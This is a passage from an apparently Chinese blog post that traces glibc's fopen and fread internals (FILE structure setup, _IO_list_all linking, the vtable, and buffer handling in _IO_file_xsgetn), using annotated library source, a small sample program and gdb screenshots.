  <span class="token keyword">if</span> <span class="token punctuation">(</span>orientation <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span># 初始化fp的_wide_data字段
      fp<span class="token operator">-&gt;</span>_wide_data <span class="token operator">=</span> wd<span class="token punctuation">;</span>
      fp<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_buf_base <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
      fp<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_buf_end <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
      fp<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_read_base <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
      fp<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_read_ptr <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
      fp<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_read_end <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
      fp<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_write_base <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
      fp<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_write_ptr <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
      fp<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_write_end <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
      fp<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_save_base <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
      fp<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_backup_base <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
      fp<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_save_end <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

      fp<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_wide_vtable <span class="token operator">=</span> jmp<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
    <span class="token comment">/* Cause predictable crash when a wide function is called on a byte
       stream.  */</span>
    fp<span class="token operator">-&gt;</span>_wide_data <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">_IO_wide_data</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">1L</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
  fp<span class="token operator">-&gt;</span>_freeres_list <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br></div></div><p>​    可以看到函数最主要的功能是初始化locked_FILE里面的_IO_FILE_plus结构体，基本上将所有的值都初始化为NULL以及默认值，同时将_wide_data字段赋值并初始化。初始化结束后，FILE结构体如下。</p> <p><img src="/images/heap/image-20211226163910860.png" alt="image-20211226163910860"></p> <p>执行完_IO_no_init后，函数使用lea指令将_IO_FILE_plus结构体的vtable设置成了_IO_file_jumps(0x7ffff7dd06e0)。</p> <p><img src="/images/heap/image-20211226163917758.png" alt="image-20211226163917758"></p> <p>然后调用_IO_file_init将_IO_FILE_plus结构体链接到了_IO_list_all链表中，跟进该函数。</p> <p><img src="/images/heap/image-20211226163921748.png" alt="image-20211226163921748"></p> <p>该函数在/libio/fileops.c中。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">void</span>
<span class="token function">_IO_new_file_init</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">_IO_FILE_plus</span> <span class="token operator">*</span>fp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token comment">/* POSIX.1 allows another file handle to be used to change the position
     of our file descriptor.  Hence we actually don't know the actual
     position before we do the first fseek (and until a following fflush). */</span>
  fp<span class="token operator">-&gt;</span>file<span class="token punctuation">.</span>_offset <span class="token operator">=</span> _IO_pos_BAD<span class="token punctuation">;</span>
  fp<span class="token operator">-&gt;</span>file<span class="token punctuation">.</span>_IO_file_flags <span class="token operator">|=</span> CLOSED_FILEBUF_FLAGS<span class="token punctuation">;</span>

 # 调用_IO_link_in和设置_fileno
  <span class="token function">_IO_link_in</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  fp<span class="token operator">-&gt;</span>file<span class="token punctuation">.</span>_fileno <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>可以看到这个函数的主体是调用了_IO_link_in函数，跟进去，函数在/libio/genops.c中。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">void</span>
<span class="token function">_IO_link_in</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">_IO_FILE_plus</span> <span class="token operator">*</span>fp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
# 检查flag的标志位是否是_IO_LINKED
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>file<span class="token punctuation">.</span>_flags <span class="token operator">&amp;</span> _IO_LINKED<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
# 设置_IO_LINKED标志位
      fp<span class="token operator">-&gt;</span>file<span class="token punctuation">.</span>_flags <span class="token operator">|=</span> _IO_LINKED<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">_IO_MTSAFE_IO</span></span>
      <span class="token function">_IO_cleanup_region_start_noarg</span> <span class="token punctuation">(</span>flush_cleanup<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">_IO_lock_lock</span> <span class="token punctuation">(</span>list_all_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>
      run_fp <span class="token operator">=</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token punctuation">;</span>
      <span class="token function">_IO_flockfile</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
      fp<span class="token operator">-&gt;</span>file<span class="token punctuation">.</span>_chain <span class="token operator">=</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span><span class="token punctuation">)</span> _IO_list_all<span class="token punctuation">;</span>
      _IO_list_all <span class="token operator">=</span> fp<span class="token punctuation">;</span>
      <span class="token operator">++</span>_IO_list_all_stamp<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">_IO_MTSAFE_IO</span></span>
      <span class="token function">_IO_funlockfile</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
      run_fp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
      <span class="token function">_IO_lock_unlock</span> <span class="token punctuation">(</span>list_all_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">_IO_cleanup_region_end</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br></div></div><p>​    FILE结构体是通过_IO_list_all的单链表进行管理的，这里_IO_link_in函数的功能是检查FILE结构体是否包含_IO_LINKED标志，如果不包含则表示这个结构体没有链接进入_IO_list_all，则在后面将其链接进_IO_list_all链表，同时设置FILE结构体的_chain字段为之前的链表的值，否则直接返回。</p> <p>​    所有_IO_file_init主要功能是将FILE结构体链接进入_IO_list_all链表。在没执行_IO_file_init函数前，_IO_list_all指向的是stderr结构体。</p> <p><img src="/images/heap/image-20211226164005395.png" alt="image-20211226164005395"></p> <p>​    执行完后可以看到_IO_list_all指向的是申请出来的结构体。</p> <p><img src="/images/heap/image-20211226164030798.png" alt="image-20211226164030798"></p> <p>​    此时FILE结构体的_chain字段指向了之前的stderr结构体。</p> <p><img src="/images/heap/image-20211226164021315.png" alt="image-20211226164021315"></p> <p>将FILE结构体链接到_IO_list_all链表后，程序返回到__fopen_internal中，最后是调用_IO_file_open函数打开文件句柄，跟进该函数。函数在/libio/fileops.c中。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>_IO_FILE <span class="token operator">*</span>
<span class="token function">_IO_new_file_fopen</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>filename<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>mode<span class="token punctuation">,</span>
            <span class="token keyword">int</span> is32not64<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  # 检查文件是否以打开，打开则返回
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_IO_file_is_open</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  ## 设置文件打开模式
  <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token operator">*</span>mode<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
    <span class="token keyword">case</span> <span class="token string">'r'</span><span class="token operator">:</span>
      omode <span class="token operator">=</span> O_RDONLY<span class="token punctuation">;</span>
      read_write <span class="token operator">=</span> _IO_NO_WRITES<span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    
     <span class="token punctuation">}</span>
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  # 调用_IO_file_open函数
  result <span class="token operator">=</span> <span class="token function">_IO_file_open</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> omode<span class="token operator">|</span>oflags<span class="token punctuation">,</span> oprot<span class="token punctuation">,</span> read_write<span class="token punctuation">,</span>
              is32not64<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><p>函数会先检查文件描述符是否打开，然后设置文件打开的模式，最后调用_IO_file_open函数。跟进_IO_file_open函数，该函数在/libio/fileops.c中。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>_IO_FILE <span class="token operator">*</span>
<span class="token function">_IO_file_open</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>filename<span class="token punctuation">,</span> <span class="token keyword">int</span> posix_mode<span class="token punctuation">,</span> <span class="token keyword">int</span> prot<span class="token punctuation">,</span>
           <span class="token keyword">int</span> read_write<span class="token punctuation">,</span> <span class="token keyword">int</span> is32not64<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> fdesc<span class="token punctuation">;</span>

  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  # 调用系统函数open打开文件  
  fdesc <span class="token operator">=</span> <span class="token function">open</span> <span class="token punctuation">(</span>filename<span class="token punctuation">,</span> posix_mode <span class="token operator">|</span> <span class="token punctuation">(</span>is32not64 <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> O_LARGEFILE<span class="token punctuation">)</span><span class="token punctuation">,</span> prot<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  # 将文件描述符设置到FILE结构体的相应字段_fileno里
  fp<span class="token operator">-&gt;</span>_fileno <span class="token operator">=</span> fdesc<span class="token punctuation">;</span>
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  #再次调用_IO_link_in
  <span class="token function">_IO_link_in</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">_IO_FILE_plus</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> fp<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><p>​    函数的主要功能就是执行系统调用open打开文件，并将文件描述符赋值给FILE结构体的_fileno字段，最后再次调用_IO_link_in函数，确保该结构体被链接到_IO_list_all链表。</p> <p>​    执行完_IO_new_file_fopen函数后，FILE结构体如下图所示。</p> <p><img src="/images/heap/image-20211226164125792.png" alt="image-20211226164125792"></p> <p>​    该函数执行完后，程序返回FILE结构体指针，分析结束。</p> <p>整个流程还是比较清晰的，fopen返回之后，_IO_list_all链表指向返回的FILE结构体，且FILE结构体的_chain字段指向之前的结构体（没有其他额外打开文件的话，将指向stderr结构体），同时其他的字段大多是默认的NULL值，vtable存储的是_IO_file_jumps。</p> <h2 id="io-file之fread">IO_FILE之fread <a href="#io-file之fread" class="header-anchor">#</a></h2> <p>前面分析了系统如何为FILE结构体分配内存并将其链接进_IO_list_all，那么这里则是讲述创建文件FILE之后，fread如何实现从文件中读取数据的。fread的大致流程如下。</p> <p><img src="/images/heap/image-20211226164140497.png" alt="image-20211226164140497"></p> <p>整体流程为fread调用vtable中的IO_file_xsgetn，其中IO_file_xsgetn是fread的核心函数，它的流程大致如下：</p> <ol><li><p>判断fp-&gt;_IO_buf_base输入缓冲区是否为空，如果为空则调用_IO_doalllocbuf去初始化输入缓冲区。</p></li> <li><p>在分配完输入缓冲区或输入缓冲区不为空的情况下，判断输入缓冲区是否存在数据。</p></li> <li><p>如果输入缓冲区有数据则直接拷贝至用户缓冲区，如果没有或不够则调用_underflow函数执行系统调用读取数据到输入缓冲区，再拷贝到用户缓冲区。</p></li></ol> <p>fread的函数原型是：</p> <p>size_t fread ( void * ptr, size_t size, size_t count, FILE * stream );</p> <p>其中，ptr：指向保存结果的指针；size：每个数据类型的大小；count：数据的个数；stream：文件指针函数返回读取数据的个数。</p> <p>示例程序如下。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

    FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">&quot;test&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;rb&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fread</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>编译完成后用gdb进行调试。</p> <p>断点下载fread，在开始之前先查看下FILE结构体fp的内容。从下面的图里可以看到此时_IO_read_ptr和_IO_buf_base等指针都是空的，后面的分析一个很重要的步骤就是看这些指针是如何被赋值以及发挥作用的。</p> <p><img src="/images/heap/image-20211226164218192.png" alt="image-20211226164218192"></p> <p>vtable中的指针内容如下。</p> <p><img src="/images/heap/image-20211226164224662.png" alt="image-20211226164224662"></p> <p>fread实际上是_IO_fread函数，文件目录为/libio/iofread.c。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>_IO_size_t
<span class="token function">_IO_fread</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> _IO_size_t size<span class="token punctuation">,</span> _IO_size_t count<span class="token punctuation">,</span> _IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  _IO_size_t bytes_requested <span class="token operator">=</span> size <span class="token operator">*</span> count<span class="token punctuation">;</span>
  _IO_size_t bytes_read<span class="token punctuation">;</span>
  <span class="token function">CHECK_FILE</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>bytes_requested <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">_IO_acquire_lock</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>

# 调用_IO_sgetn函数
  bytes_read <span class="token operator">=</span> <span class="token function">_IO_sgetn</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> buf<span class="token punctuation">,</span> bytes_requested<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">_IO_release_lock</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> bytes_requested <span class="token operator">==</span> bytes_read <span class="token operator">?</span> count <span class="token operator">:</span> bytes_read <span class="token operator">/</span> size<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>_IO_fread<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><p>_IO_fread函数调用了_IO_sgetn函数，跟进该函数。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>_IO_size_t
<span class="token function">_IO_sgetn</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">,</span> _IO_size_t n<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token comment">/* FIXME handle putback buffer here! */</span>
  <span class="token keyword">return</span> <span class="token function">_IO_XSGETN</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> data<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>_IO_sgetn<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>又看到其调用了_IO_XSGETN函数，查看其定义。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">_IO_XSGETN</span><span class="token punctuation">(</span>FP<span class="token punctuation">,</span> DATA<span class="token punctuation">,</span> N<span class="token punctuation">)</span> <span class="token function">JUMP2</span> <span class="token punctuation">(</span>__xsgetn<span class="token punctuation">,</span> FP<span class="token punctuation">,</span> DATA<span class="token punctuation">,</span> N<span class="token punctuation">)</span></span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>​    实际上就是FILE结构体中vtable的__xsgetn函数，跟进去/libio/fileops.c。</p> <p>​    _IO_file_xsgetn是处理fread读入数据的核心函数，分为以下几个部分：</p> <ol><li><p>fp-&gt;_IO_buf_base为空时，表明此时的FILE结构体中的指针未被初始化，输入缓冲区未建立，则调用_IO_doallocbuf去初始化指针，建立输入缓冲区。</p></li> <li><p>输入缓冲区有输入，即fp-&gt;_IO_read_ptr小于fp-&gt;_IO_read_end，此时将缓冲区里的数据直接拷贝到目标buff。</p></li> <li><p>输入缓冲区里的数据为空或者是不能满足全部的需求，则调用__underflow调用系统调用读入数据。</p></li></ol> <div class="language-c line-numbers-mode"><pre class="language-c"><code>_IO_size_t
<span class="token function">_IO_file_xsgetn</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">,</span> _IO_size_t n<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  _IO_size_t want<span class="token punctuation">,</span> have<span class="token punctuation">;</span>
  _IO_ssize_t count<span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>s <span class="token operator">=</span> data<span class="token punctuation">;</span>

  want <span class="token operator">=</span> n<span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>_IO_buf_base <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
      # <span class="token number">1</span>、如果fp<span class="token operator">-&gt;</span>_IO_buf_base为空的话则调用_IO_doallocbuf
      <span class="token function">_IO_doallocbuf</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

  <span class="token keyword">while</span> <span class="token punctuation">(</span>want <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>

      have <span class="token operator">=</span> fp<span class="token operator">-&gt;</span>_IO_read_end <span class="token operator">-</span> fp<span class="token operator">-&gt;</span>_IO_read_ptr<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>want <span class="token operator">&lt;=</span> have<span class="token punctuation">)</span>   # <span class="token number">2</span>、输入缓冲区里已经有足够的字符，则直接把缓冲区里的字符给目标buff
    <span class="token punctuation">{</span>
      <span class="token function">memcpy</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span> fp<span class="token operator">-&gt;</span>_IO_read_ptr<span class="token punctuation">,</span> want<span class="token punctuation">)</span><span class="token punctuation">;</span>
      fp<span class="token operator">-&gt;</span>_IO_read_ptr <span class="token operator">+=</span> want<span class="token punctuation">;</span>
      want <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
      <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>have <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>  # <span class="token number">3</span>、输入缓冲区里有部分字符，但是没有达到fread的size需求，先把已有的拷贝至目标buff
        <span class="token punctuation">{</span>
          <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
          <span class="token function">memcpy</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span> fp<span class="token operator">-&gt;</span>_IO_read_ptr<span class="token punctuation">,</span> have<span class="token punctuation">)</span><span class="token punctuation">;</span>
          s <span class="token operator">+=</span> have<span class="token punctuation">;</span>

          want <span class="token operator">-=</span> have<span class="token punctuation">;</span>
          fp<span class="token operator">-&gt;</span>_IO_read_ptr <span class="token operator">+=</span> have<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>


      <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>_IO_buf_base
          <span class="token operator">&amp;&amp;</span> want <span class="token operator">&lt;</span> <span class="token punctuation">(</span>size_t<span class="token punctuation">)</span> <span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>_IO_buf_end <span class="token operator">-</span> fp<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__underflow</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>  # <span class="token number">4</span>、输入缓冲区里不能满足需求，调用__underflow读入数据
         <span class="token keyword">break</span><span class="token punctuation">;</span>

          <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  <span class="token keyword">return</span> n <span class="token operator">-</span> want<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
